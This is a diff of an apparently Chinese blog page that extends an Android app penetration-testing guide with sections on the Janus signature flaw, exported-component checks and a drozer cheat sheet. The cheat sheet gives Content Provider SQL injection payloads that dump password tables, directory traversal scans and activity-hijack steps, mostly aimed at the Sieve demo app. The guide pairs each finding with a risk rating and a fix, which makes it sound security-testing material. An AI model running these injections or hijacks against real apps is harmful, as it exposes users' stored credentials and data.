@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      914 字
+      2k 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      9
+      23
        分钟
     </span>
   
@@ -240,9 +240,9 @@
 <a id="more"></a>
 
 <hr>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大概的渗透测试概要</p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透测试概要</p>
 <p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/20200514093744.png" srcset="/img/loading.gif"></p>
-<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>Kali;sdk</p>
+<h1 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h1><p>kali;sdk</p>
 <h1 id="客户端安全"><a href="#客户端安全" class="headerlink" title="客户端安全"></a>客户端安全</h1><h2 id="安装包签名"><a href="#安装包签名" class="headerlink" title="安装包签名"></a>安装包签名</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><blockquote>
 <p>Andoid系统会在安装apk的时候，检查签名，签名不同，没有签名或者签名不通过的，不能进行安装或者覆盖。方法是：获取打包在apk里面的数字证书（里面有公钥），该证书是自签名证书，用证书公钥验证该证书的合法性（该证书有自己的私钥对该证书进行签名，而不是第三方权威机构的私钥），判断证书的有效期，然后利用该证书的公钥对包文件的签名进行验证。</p>
 </blockquote>
@@ -280,6 +280,31 @@
 <p>apktool</p>
 <h3 id="渗透步骤-1"><a href="#渗透步骤-1" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p><strong>androidkiller解压文件包，修改解包目录下的资源文件（logo之类好确认）</strong></p>
 <p>" srcset="/img/loading.gif<img src=""></p>
+<h3 id="威胁等级-2"><a href="#威胁等级-2" class="headerlink" title="威胁等级"></a>威胁等级</h3><p>威胁等级 </p>
+<h3 id="安全建议-2"><a href="#安全建议-2" class="headerlink" title="安全建议"></a>安全建议</h3><h2 id="证书签名版本校验"><a href="#证书签名版本校验" class="headerlink" title="证书签名版本校验"></a>证书签名版本校验</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><blockquote>
+<p>Janus漏洞（CVE-2017-13156）: 修改安卓app而不影响签名</p>
+</blockquote>
+<h3 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/bihe0832/Android-GetAPKInfo/releases">getapkinfo</a></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>GetApkInfo.<span class="hljs-keyword">jar </span>*.apk     <span class="hljs-comment">#查看APK信息及签名版本</span><br></code></pre></td></tr></table></figure>
+<h3 id="渗透步骤-2"><a href="#渗透步骤-2" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p>该app存在Janus签名漏洞<br>此处只使用了v1校验，导致存在Janus签名漏洞。至少也要包含v2校验</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20210111162242.png" srcset="/img/loading.gif"></p>
+<h3 id="威胁等级-3"><a href="#威胁等级-3" class="headerlink" title="威胁等级"></a>威胁等级</h3><p>威胁等级<br>app只使用了V1签名则为高危</p>
+<h3 id="安全建议-3"><a href="#安全建议-3" class="headerlink" title="安全建议"></a>安全建议</h3><p>使用Signaturescheme V2签名</p>
+<h2 id="四大组件权限控制"><a href="#四大组件权限控制" class="headerlink" title="四大组件权限控制"></a>四大组件权限控制</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><blockquote>
+<p>本项主要测试客户端是否包含后台服务、Content Provider、第三方调用和广播 等组件，Intent 权限的设置是否安全。应用不同组成部分之间的机密数据传递是否安全。检查客户端是否存在组件劫持风险，查看客户端程序具有导出哪些应用信息的权限。反编  译 APK 文件后，检查 AndroidManifest 文件中是否有多余的 android:export 声明，客户端是否存在导出其他应用信息的权限等</p>
+</blockquote>
+<h3 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/drozer/releases">drozer</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.appscan.io/home.html?lang=cn">在线检测1</a><br><a target="_blank" rel="noopener" href="https://console.cloud.tencent.com/ms/scan/upload">在线检测2</a><br><a target="_blank" rel="noopener" href="https://dev.bangcle.com/apps/index">在线检测3</a></p>
+<h3 id="渗透步骤-3"><a href="#渗透步骤-3" class="headerlink" title="渗透步骤"></a>渗透步骤</h3><p><strong>这里只贴出检测activity劫持漏洞</strong>（检查是否存在 activity 劫持风险，确认客户端是否能够发现并提示用户存在劫持。）</p>
+<p>这里发现activity的权限缺乏控制，permission均为null 尝试利用<br><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20210112095459.png" srcset="/img/loading.gif"></p>
+<p>成功使用drozer启动activity，第三方应用也可以启动钓鱼界面来欺骗用户。</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/alpha302.github.io/master/20210112095521.png" srcset="/img/loading.gif"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java">adb连接        adb forward tcp:<span class="hljs-number">31415</span> tcp:<span class="hljs-number">31415</span><br>连接drozer     drozer console connect<br>-----------------------------------------------------------------<br>adb检测四大组件<br><br>dz&gt; run app.<span class="hljs-keyword">package</span>.attacksurface [<span class="hljs-keyword">package</span> name] 确定应用的攻击面<br><br>dz&gt; list # 列出所有模块<br><br>dz&gt; run app.package.list # 列出设备中所有已安装的包<br>dz&gt; run app.<span class="hljs-keyword">package</span>.list -f [app name]<br>dz&gt; run app.package.info -h # show UID/Permission etc.<br><br><br>确定应用的受攻击面<br><br>dz&gt; run app.<span class="hljs-keyword">package</span>.attacksurface [<span class="hljs-keyword">package</span> name]<br><br><span class="hljs-number">4.</span>运行Activity<br>获取Activity信息<br><br>dz&gt; run app.activity.info -a com.mwr.example.sieve<br><br>dz&gt; run app.activity.start --component com.mwr.example.sieve<br>dz&gt; help app.activity.start<br><br><br><span class="hljs-number">5.</span>Content Provider<br>(<span class="hljs-number">1</span>) 获取Content Provider信息<br><br>	<br>(<span class="hljs-number">2</span>) Content Provider数据泄露<br>先获取所有可以访问的Uri：<br><br>	dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve<br>获取各个Uri的数据<br><br>	dz&gt; run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical</span><br>查询到数据说明存在漏洞<br>(<span class="hljs-number">3</span>)Content Provider SQL注入<br><br>	dz&gt; run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;&#x27;&quot;</span><br>	dz&gt; run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --selection &quot;&#x27;&quot;</span><br>报错说明存在SQL注入<br>列出所有表：<br><br>	dz&gt; run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* from sqlite_master where type=&#x27;table&#x27;;--&quot;</span><br>获取某个表中的数据<br><br>	dz&gt; run app.provider.query content:<span class="hljs-comment">//com.mwr.example.sieve.DBContentProvider/Passwords/ --projection &quot;* from Key;--&quot;</span><br>(<span class="hljs-number">4</span>) 同时检测SQL注入和目录遍历<br><br>	dz&gt; run scanner.provider.injection -a com.mwr.example.sieve<br>	dz&gt; run scanner.provider.traversal -a com.mwr.example.sieve<br><br>运行Service<br><br>	dz&gt; run app.service.start --component com.linkedin.android com.linkedin.android.authenticator.AuthenticationService<br><br><br><span class="hljs-number">6.</span>Service<br>获取Service详情<br><br>	dz&gt; run app.service.info -a com.mwr.example.sieve<br>不使用drozer启动service<br><br>	shell<span class="hljs-meta">@hammerhead</span>:/$ am startservice -n <span class="hljs-keyword">package</span>.name/.SerivceName<br><span class="hljs-number">7.</span>Broadcast Receiver<br><br>	dz&gt; run app.broadcast.info # 获取broadcast receiver信息<br>	dz&gt; run app.broadcast.send # 通过intent发送broadcast receiver<br><span class="hljs-number">8.</span>文件操作<br>列出指定文件路径里全局可写/可读的文件<br><br>	dz&gt; run scanner.misc.writablefiles --privileged /data/data/com.sina.weibo<br>	dz&gt; run scanner.misc.readablefiles --privileged /data/data/com.sina.weibo<br>	dz&gt; run app.broadcast.send --component 包名 --action android.intent.action.XXX<br><span class="hljs-number">9.</span>其他模块<br><br>	dz&gt; shell.start # 在设备上开启一个交互shell<br>	dz&gt; tools.file.upload / tools.file.download #上传/下载文件到设备<br>	dz&gt; tools.setup.busybox / tools.setup.munimalsu #安装可用的二进制文件<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="威胁等级-4"><a href="#威胁等级-4" class="headerlink" title="威胁等级"></a>威胁等级</h3><p>若不存在组件暴露的情况，此时无风险。<br>如存在组件暴露的情况，但暴露的组件无关客户端逻辑核心或不会泄露用户敏感信息， 此时低风险；<br>若暴露的组件会泄露用户敏感信息（例如邮件客户端存在消息组件的暴露，攻  击者可以通过编写 APK，通过组件利用的方式读取用户邮件信息）</p>
+<h3 id="安全建议-4"><a href="#安全建议-4" class="headerlink" title="安全建议"></a>安全建议</h3><p>避免不必要的组件导出。</p>
+<hr>
 
             </div>
             <hr>
